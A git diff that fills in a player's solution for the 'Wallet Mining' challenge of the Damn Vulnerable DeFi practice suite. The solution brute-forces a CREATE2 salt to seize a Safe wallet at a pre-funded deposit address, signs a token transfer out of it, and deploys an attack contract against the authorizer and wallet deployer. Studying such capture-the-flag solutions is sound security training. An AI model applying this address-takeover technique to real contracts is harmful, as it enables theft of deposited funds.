@@ -3,7 +3,7 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
+import {SafeProxyFactory, SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {Create2} from "@openzeppelin/contracts/utils/Create2.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
@@ -11,8 +11,10 @@ import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
 import {
     AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
 } from "../../src/wallet-mining/AuthorizerFactory.sol";
+import {AttackWalletMining} from "./AttackWalletMining.sol";
+import {HelpUtils} from "../HelpUtils.sol";
 
-contract WalletMiningChallenge is Test {
+contract WalletMiningChallenge is Test, HelpUtils {
     address deployer = makeAddr("deployer");
     address upgrader = makeAddr("upgrader");
     address ward = makeAddr("ward");
@@ -122,7 +124,66 @@ contract WalletMiningChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_walletMining() public checkSolvedByPlayer {}
+    function test_walletMining() public checkSolvedByPlayer {
+        address[] memory _owners = new address[](1);
+        address ZEROAddr = address(0);
+        _owners[0] = user;
+        bytes memory initializer =
+            abi.encodeCall(Safe.setup, (_owners, 1, ZEROAddr, "", ZEROAddr, ZEROAddr, 0, payable(0)));
+        uint256 saltNonce;
+        {
+            bool flag;
+            while (!flag) {
+                address proxy_ = vm.computeCreate2Address(
+                    keccak256(abi.encodePacked(keccak256(initializer), saltNonce)),
+                    keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))))),
+                    address(proxyFactory)
+                );
+                // address proxy_ = address(proxyFactory.createProxyWithNonce(address(singletonCopy), initializer, saltNonce));
+                if (proxy_ == USER_DEPOSIT_ADDRESS) {
+                    flag = true;
+                    break;
+                }
+                ++saltNonce;
+            }
+        }
+
+        bytes memory execT_data;
+
+        {
+            address to = address(token);
+            uint256 value;
+            bytes memory data = abi.encodeCall(token.transfer, (user, DEPOSIT_TOKEN_AMOUNT));
+            Enum.Operation operation = Enum.Operation.Call;
+            uint256 safeTxGas;
+            uint256 baseGas;
+            uint256 gasPrice;
+            address gasToken;
+            address payable refundReceiver;
+
+            bytes32 hash_Tx = HelpUtils.getTransactionHash_Safe(
+                to,
+                value,
+                data,
+                operation,
+                safeTxGas,
+                baseGas,
+                gasPrice,
+                gasToken,
+                refundReceiver,
+                0,
+                USER_DEPOSIT_ADDRESS
+            );
+
+            bytes memory signatures = HelpUtils.getSignature(userPrivateKey, hash_Tx);
+
+            execT_data = abi.encode(
+                to, value, data, operation, safeTxGas, baseGas, gasPrice, gasToken, refundReceiver, signatures
+            );
+        }
+
+        new AttackWalletMining(authorizer, walletDeployer, initializer, saltNonce, execT_data, ward);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
